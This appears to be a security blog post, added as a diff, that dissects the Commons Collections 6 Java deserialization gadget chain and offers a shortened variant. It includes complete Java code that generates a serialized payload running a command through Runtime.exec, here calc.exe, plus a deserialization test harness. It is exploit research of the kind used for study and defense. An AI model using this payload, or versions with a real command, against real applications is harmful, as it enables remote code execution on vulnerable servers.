@@ -1,0 +1,216 @@
+---
+layout: default
+---
+<html>
+<body>
+<h1>CommonsCollection6</h1>
+
+<p>
+    On this blog post we will learn about commonsCollection6 payload.
+</p>
+
+<p>
+    In this blog post we will take a slight different path . instead of learning the exact payload, we will learn why that particular payload and see if we can optimize it.
+</p>
+
+<p>
+    So let's jump in
+</p>
+<p>
+    Below is how the gadget Chain looks like for commonsCollection6.
+</p>
+<p>
+    <pre>
+        <code>
+            java.io.ObjectInputStream.readObject()
+            java.util.HashSet.readObject()
+                java.util.HashMap.put()
+                java.util.HashMap.hash()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+                        org.apache.commons.collections.map.LazyMap.get()
+                            org.apache.commons.collections.functors.ChainedTransformer.transform()
+                            org.apache.commons.collections.functors.InvokerTransformer.transform()
+                            java.lang.reflect.Method.invoke()
+                                java.lang.Runtime.exec()
+        </code>
+    </pre>
+</p>
+<p>
+    let's divide the chain in 2 parts.<br><br>
+    1st half<br>
+    <pre>
+        <code>
+            java.io.ObjectInputStream.readObject()
+            java.util.HashSet.readObject()
+                java.util.HashMap.put()
+                java.util.HashMap.hash()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+        </code>
+    </pre>
+    <br>
+    2nd half <br>
+    <pre>
+        <code>
+                            org.apache.commons.collections.map.LazyMap.get()
+                            org.apache.commons.collections.functors.ChainedTransformer.transform()
+                            org.apache.commons.collections.functors.InvokerTransformer.transform()
+                            java.lang.reflect.Method.invoke()
+                                java.lang.Runtime.exec()
+        </code>
+    </pre>
+</p>
+<p>If you pay close attention, we already know how the 2nd half works, basically we set a hasmap and a transformerchain in lazyMap and when the get() doesn't find the key we get RCE</p>
+<p>So let focus our attention on the first part i.e the entry part.</p>
+
+<p>
+    If you take a down-to-top approach, we will see that the TiedMapEntry.getValue() calls the lazymap.get().
+    <br>
+    <img src="images/cc/getvalue_calling_map_get.PNG"><br>
+    <br>
+
+    SO where ever the TiedMapEntry.getValue() is getting called might be used as an intermediate gadget function.
+</p>
+<p>
+    Searching for this function call on TiedMapEntry class we see 2 functions hashCode() and toString().
+    This toString() was used in CC5 so let's look into the hashCode().
+</p>
+<p>
+    <img src="images/cc/tidemapgetvaluecalls.PNG">
+</p>
+<p>Now this HashCode() method can be getting called in lot of places, but from out past research we know that it definitiely gets called in HashMap.hash(), which is again getting called in put().</p>
+<p>So if we can reach HashMap.put() from ObjectInputStream.readObject() we can reach till the LazyMap.get() which will execute our code.</p>
+<P>The ysoserial payload says that we can reach till the hashmap.put() using HashSet class, which is true but its little bit complex, you can't just set the key value of the Hashmap and let it go on as the required functionsDoesn
+    exist, and that is why even in the ysoserial payload they are getting map field and table field from the innerImplementation.
+</P>
+
+<p>
+    But if you pay close attention you can see that the HashMap.readObject() there is a function called <pre><code>putVal(hash(key), key, value, false, false);</code></pre>.
+    <img src="images/cc/hashmapreadobjectcall.PNG"><br><br>
+    The<pre><Code>hash(key)</Code></pre> calls <pre><code> key.hashCode()</code></pre>.
+    <br>
+    <br>
+    <img src="images/cc/has_on_hashmap.PNG">
+    <br>
+    <br>
+    So if set the Key of the hashMap as TideMapEntry then the hashMap readObject can reach till TideMapEntry.hashCode() skipping the hashset part.
+</p>
+
+<p>
+    SO below is how the modified code looks like for CommonsCollection6 Gadget Chain.
+</p>
+<p>
+    <pre>
+        <code>
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class cc6complete {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
+        Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map lazymap = LazyMap.decorate(innerMap,transformerChain);
+        TiedMapEntry tme = new TiedMapEntry(lazymap,"keykey");
+        Map newmap = new HashMap();
+        newmap.put(tme,"BLABLBLA");
+        lazymap.remove("keykey");
+
+FileOutputStream fos = new FileOutputStream("testing11.ser");
+ObjectOutputStream oos = new ObjectOutputStream(fos);
+oos.writeObject(newmap);
+oos.close();
+    }
+} 
+
+        </code>
+    </pre>
+</p>
+<P>
+    Keep in mind that when you execute this a calc.exe will popout and if you deserialize the payload stored in testing11.ser then also a calc.exe will pop up.
+</P>
+<p>
+    If you don't want the calc.exe to pop duing the first time you have to use the reflections.
+</p>
+<p>
+    <pre>
+        <code>
+import java.io.FileInputStream;
+import java.io.ObjectInputStream;
+
+public class checkclass {
+
+    public static void main(String args[])
+    {
+          try {
+            FileInputStream fis = new FileInputStream("E:\\ysoserialresearch\\testing11.ser");
+            ObjectInputStream ois = new ObjectInputStream(fis);
+
+       
+            Object obj = ois.readObject();
+
+            ois.close();
+            fis.close();
+
+            System.out.println("Deserialization complete: " + obj.getClass().getName());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    }
+    
+
+        </code>
+    </pre>
+</p>
+<p>
+    we can use the above code to verify the deserialization chain.
+</p>
+
+
+<h2>Summary</h2>
+<p>
+    In this blog post, we dissected the CommonsCollections6 gadget chain by breaking it into two logical halves: 
+    the deserialization path leading up to `TiedMapEntry.getValue()` and the invocation path that triggers `Runtime.exec()`.
+</p>
+<p>
+    Rather than following the conventional `HashSet`-based approach used in tools like ysoserial, we optimized the chain 
+    by directly setting a `TiedMapEntry` as the key in a `HashMap`, leveraging how `HashMap.readObject()` internally calls 
+    `putVal()` and triggers `key.hashCode()` during deserialization.
+</p>
+<p>
+    This not only simplified the gadget chain but also demonstrated how understanding the internals of `HashMap` can open 
+    alternative exploitation paths. A working PoC was also shared to illustrate the concept.
+</p>
+<p>
+    Such optimizations are critical in real-world exploitation where gadget minimization or custom bypasses are necessary.
+</p>
+
+<p>Thats it for Today.</p>
+<p>Thanks For Reading.</p>
+<p>Happy Hacking.</p>
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+</body>
+</html>
